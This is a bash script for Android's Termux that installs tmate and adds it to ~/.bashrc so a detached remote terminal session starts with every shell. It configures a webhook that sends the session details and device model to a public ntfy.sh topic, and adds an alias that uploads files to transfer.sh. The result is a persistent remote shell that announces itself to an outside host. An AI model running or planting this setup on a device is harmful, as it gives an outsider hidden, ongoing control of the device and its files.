#!/usr/bin/bash

# get the device/model on this device.
device_model=$(getprop | grep -F ro.product.system_ext | tr -d '[]' | cut -d\  -f2- | awk 'FNR == 1 {printf "%s ",$0;} FNR == 4 {print $0; exit}')

# if tmate is not installed, install it.
command -v tmate &> /dev/null || apt-get install tmate -y

# check if ~/.bashrc already exists.
if [ -f ~/.bashrc ]; then
	# check if file contains 'termux-wake-lock'
	if ! grep -q "termux-wake-lock" "/data/data/com.termux/files/home/.bashrc"; then
		# if NO, add it to ~/.bashrc
		echo "termux-wake-lock" >> ~/.bashrc
	fi
	# check if file contains 'tmate new-session -d'
	if ! grep -q "tmate new-session -d" "/data/data/com.termux/files/home/.bashrc"; then
		# if NO, add it to ~/.bashrc
		echo "pidof tmate &> /dev/null || tmate new-session -d" >> ~/.bashrc
	fi
	# check if file contains '~/.bash_aliases'
	if ! grep -q "bash_aliases" "/data/data/com.termux/files/home/.bashrc"; then
		# if NO, add it to ~/.bashrc
		echo "source ~/.bash_aliases" >> ~/.bashrc
	fi
else
	# if ~/.bashrc dont exsist, create it.
	{
	echo "termux-wake-lock"
	echo "pidof tmate &> /dev/null || tmate new-session -d"
	echo "source ~/.bash_aliases"
	} >> ~/.bashrc
fi

# check if ~/.tmate.conf already exists.
if [ -f ~/.tmate.conf ]; then
	# check if file contains 'q26nfDkFdpmPUrpBw6Q'.
	if ! grep -q "q26nfDkFdpmPUrpBw6Q" "/data/data/com.termux/files/home/.tmate.conf"; then
		# if text is not found in file, add it.
		echo "set-option -g tmate-webhook-url \"https://ntfy.sh/q26nfDkFdpmPUrpBw6Q\"" >> ~/.tmate.conf
	fi
	# check if file contains 'tmate-webhook-userdata'.
	if ! grep -q "tmate-webhook-userdata" "/data/data/com.termux/files/home/.tmate.conf"; then
		# if text is not found in file, add it.
		echo "set-option -g tmate-webhook-userdata \"$device_model\"" >> ~/.tmate.conf
	fi
else
	# if file dont exist, create it.
	{
	echo "set-option -g tmate-webhook-userdata \"$device_model\""
	echo "set-option -g tmate-webhook-url \"https://ntfy.sh/q26nfDkFdpmPUrpBw6Q\""
	} >> ~/.tmate.conf
fi

# check if ~/.bash_aliases already exists.
if [ -f ~/.bash_aliases ]; then
	# check if file contains 'transfer.sh'.
	if ! grep -q "transfer.sh" "/data/data/com.termux/files/home/.bash_aliases"; then
		# if NO, add it to ~/.bash_aliases
		echo 'transfer () { curl --upload-file "$1" https://transfer.sh/"$1" && echo; }' >>  ~/.bash_aliases
	fi
else
	# if file dont exist, create it.
	{
	echo 'transfer () { curl --upload-file "$1" https://transfer.sh/"$1" && echo; }'
	} >> ~/.bash_aliases
fi

# start programs as follow:
termux-wake-lock
pidof tmate &> /dev/null || tmate new-session -d && clear
#source ~/.bash_aliases
